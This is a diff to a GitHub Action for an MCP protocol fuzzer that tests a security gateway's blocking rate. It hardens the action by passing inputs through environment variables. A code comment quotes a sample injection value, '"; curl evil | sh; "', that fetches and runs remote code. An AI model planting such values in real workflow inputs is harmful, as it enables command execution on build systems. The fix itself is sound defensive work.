@@ -13,6 +13,9 @@ inputs:
   fail_on_bypass:
     description: Fail the action if any critical payload bypasses detection
     default: 'true'
+  control_tool:
+    description: A harmless tool on the target that must run, proving the gateway isn't blocking everything (optional)
+    default: ''
 
 outputs:
   total_tests:
@@ -47,12 +50,21 @@ runs:
     - name: Run MCP protocol fuzzer
       id: fuzz
       shell: bash
+      # Inputs go through the environment, never into the script text: a value such as
+      # `"; curl evil | sh; "` (e.g. a workflow_dispatch target_url) can't become a command.
+      env:
+        FUZZ_TARGET: ${{ inputs.target_url }}
+        FUZZ_MIN_BLOCK_RATE: ${{ inputs.min_block_rate }}
+        FUZZ_TIMEOUT: ${{ inputs.timeout_seconds }}
+        FUZZ_FAIL_ON_BYPASS: ${{ inputs.fail_on_bypass }}
+        FUZZ_CONTROL_TOOL: ${{ inputs.control_tool }}
       run: |
         node "$GITHUB_ACTION_PATH/fuzz.mjs" \
-          --target "${{ inputs.target_url }}" \
-          --min-block-rate "${{ inputs.min_block_rate }}" \
-          --timeout "${{ inputs.timeout_seconds }}" \
-          --fail-on-bypass "${{ inputs.fail_on_bypass }}"
+          --target "$FUZZ_TARGET" \
+          --min-block-rate "$FUZZ_MIN_BLOCK_RATE" \
+          --timeout "$FUZZ_TIMEOUT" \
+          --fail-on-bypass "$FUZZ_FAIL_ON_BYPASS" \
+          --control-tool "$FUZZ_CONTROL_TOOL"
 
 branding:
   icon: shield
